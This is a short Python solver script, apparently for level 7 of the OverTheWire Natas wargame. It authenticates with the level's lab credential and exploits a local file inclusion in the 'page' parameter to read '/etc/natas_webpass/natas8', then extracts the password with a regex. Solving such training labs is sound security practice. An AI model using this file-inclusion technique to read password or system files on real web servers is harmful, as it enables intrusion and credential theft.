#!/bin/python3

import requests
import re
import html.parser

username = 'natas7'
password = '7z3hEENjQtflzgnT29q7wAvMNfZdh0i9'
url = 'http://%s.natas.labs.overthewire.org' % (username)
#data = { "submit" : "submit" }

#for getting a url without any session history
#response = requests.get(url, auth = (username,password))
#content = response.text

#for communicating with the website whilst maintaining session history
session = requests.Session()
response = session.post(url + '/index.php?page=/etc/natas_webpass/natas8', auth = (username,password) )
content = html.unescape(response.text)


#for viewing the webpage
#print (content)
 

#for finding the password 
print (re.findall('<br>\n(.*)\n\n<!--',content)[0])
